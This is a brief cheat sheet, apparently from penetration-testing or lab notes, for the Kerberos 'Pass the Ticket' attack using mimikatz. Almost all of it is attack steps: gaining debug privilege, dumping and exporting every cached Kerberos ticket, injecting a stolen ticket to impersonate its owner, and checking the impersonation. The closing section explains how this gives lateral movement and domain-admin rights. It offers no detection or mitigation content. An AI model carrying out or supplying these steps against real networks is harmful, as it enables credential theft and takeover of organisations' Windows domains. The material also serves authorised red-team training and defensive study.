##################### Pass the Ticket #####################
Dump Tickets:
  mimikatz.exe   (run the command prompt as an administrator)
  privilege::debug
  sekurlsa::tickets /export

Pass the Ticket:
  kerberos::ptt <ticket>
                 Cache and impersonate the given ticket
  klist          Verify successfully impersonated ticket by listing cached tickets
                 You now have impersonated the ticket giving you the same rights 
                 as the TGT you're impersonating

Commands:
  mimikatz.exe   Run mimikatz
  privilege::debug
                 Ensure this outputs [output '20' OK] if it does not that means you do not
                 have the administrator privileges to properly run mimikatz
  sekurlsa::tickets /export
                 Export all of the .kirbi tickets into the directory that you are currently in


Informational:
  Pass the Ticket attack is used for privilege escalation and lateral movement
  if there are unsecured domain service account tickets laying around.
  The attack allows you to escalate to domain admin if you dump a domain admin's
  ticket and then impersonate that ticket using mimikatz PTT attack allowing you 
  to act as that domain admin.
